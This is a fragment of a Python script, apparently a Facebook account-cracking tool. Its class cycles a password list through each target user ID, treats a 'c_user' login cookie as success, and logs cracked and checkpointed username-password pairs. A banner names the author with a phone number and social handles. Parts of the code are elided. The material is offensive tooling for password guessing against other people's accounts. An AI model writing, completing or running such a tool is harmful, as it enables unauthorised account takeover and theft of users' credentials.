...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;32m[ BIKI 😘] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[BIKI-SUCCESSFUL] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				...
				try:
					...
					pass
				print('\r\033[1;91m[BIKI-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
...
banner="""\033[1;92m   
 888888b.  8888888 888    d8P  8888888 
 888  "88b   888   888   d8P     888   
 888  .88P   888   888  d8P      888   
 8888888K.   888   888d88K       888   
 888  "Y88b  888   8888888b      888   
 888    888  888   888  Y88b     888   
 888   d88P  888   888   Y88b    888   
 8888888P" 8888888 888    Y88b 8888888 
\033[1;37m ｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡
\033[1;94m ⇨AUTHOR    : BIKI MAHAMOOD
\033[1;95m ⇨WHATSAPP  : +919957975493
\033[1;96m ⇨FACEBOOK  : BIKI MAHAMOOD  (BIKI MAHAMOOD)
\033[1;93m ⇨INSTA     : BIKI MAHAMOOD
